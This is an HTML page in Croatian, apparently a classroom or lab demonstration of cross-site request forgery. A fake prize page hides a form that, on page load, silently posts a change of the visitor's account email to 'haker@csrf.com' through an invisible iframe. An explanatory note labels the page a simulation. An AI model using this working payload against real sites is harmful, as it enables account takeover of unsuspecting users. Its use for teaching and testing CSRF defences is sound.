<!DOCTYPE html>
<html lang="hr">
  <head>
    <meta charset="UTF-8" />
    <title>Nagradna igra</title>
    <style>
      body {
        font-family: "Segoe UI", system-ui, Arial, sans-serif;
        font-size: 15px;
        line-height: 1.55;
        color: #1a1a1a;
        max-width: 520px;
        margin: 60px auto;
        padding: 0 24px;
      }
      .box {
        border: 1px solid #ddd;
        padding: 24px;
      }
      h1 {
        font-size: 1.2rem;
        margin: 0 0 10px;
      }
      button {
        padding: 8px 16px;
        border: 1px solid #1a1a1a;
        background: #1a1a1a;
        color: #fff;
        cursor: pointer;
        font: inherit;
      }
      .note {
        margin-top: 22px;
        font-size: 0.85rem;
        color: #666;
      }
      code {
        background: #f0f0f0;
        padding: 1px 5px;
      }
    </style>
  </head>
  <body>
    <div class="box">
      <h1>Cestitamo, osvojili ste nagradu!</h1>
      <p>Kliknite za preuzimanje nagradnog bona.</p>
      <form
        id="napad"
        method="post"
        action="/account/email"
        target="nevidljivi"
      >
        <input type="hidden" name="email" value="haker@csrf.com" />
        <button type="submit">Preuzmi nagradu</button>
      </form>
    </div>

    <iframe name="nevidljivi" style="display: none"></iframe>

    <p class="note">
      Objasnjenje: ova stranica simulira zlonamjerno sjediste. Pri ucitavanju
      automatski salje krivotvoreni zahtjev za promjenu e-maila racuna zrtve na
      <code>haker@csrf.com</code>. Vratite se na pocetnu stranicu aplikacije i
      osvjezite ju da vidis ucinak.
    </p>

    <script>
      window.addEventListener("load", function () {
        document.getElementById("napad").submit();
      });
    </script>
  </body>
</html>
